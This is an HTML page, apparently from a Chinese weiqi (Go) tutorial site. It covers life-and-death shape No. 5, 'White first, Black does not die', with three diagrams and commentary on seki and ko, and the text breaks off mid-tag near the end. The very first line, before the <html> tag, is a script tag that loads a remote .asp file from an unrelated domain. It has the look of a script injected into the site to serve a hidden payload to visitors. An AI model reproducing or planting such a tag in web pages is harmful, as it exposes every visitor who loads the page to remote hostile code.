<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第5型 白先黑不死</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体">  <h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第5型          白先黑不死</span></font><!--mstheme--></font></h1> <div align="center">   <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">   <tr>     <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No5_1.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No5_2.png" width="232" height="232"><!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">结论是活棋。白方的官子手段是白1点方，至黑6成双活，如此而已。黑4先走6位也可。</span></font>       <p>　<!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白3向另一方长又当如何呢？黑4应很好，千万少惹麻烦！这里既不是丁四也不是刀五，还是双活。</span></font><!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No5_3.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白</font><font face="黑体">*</font><font face="楷体_GB2312">点时，黑就是脱先也没什么大不了的。白1长黑2托白3曲，万年劫罢了。将来白可选择双活或让黑净活而在别处讨些便宜。</span></font></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page="/C:/Documents and Settings/wangxiaohui/My Documents/My Webs/Weiqi/Part1/quchi/No5/No5.htm" S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/up_cmp_-1110_up.gif"); MSFPnav1h=MSFPpreload("../../../_derived/up_cmp_-1110_up_a.gif"); } // --></script><a hre
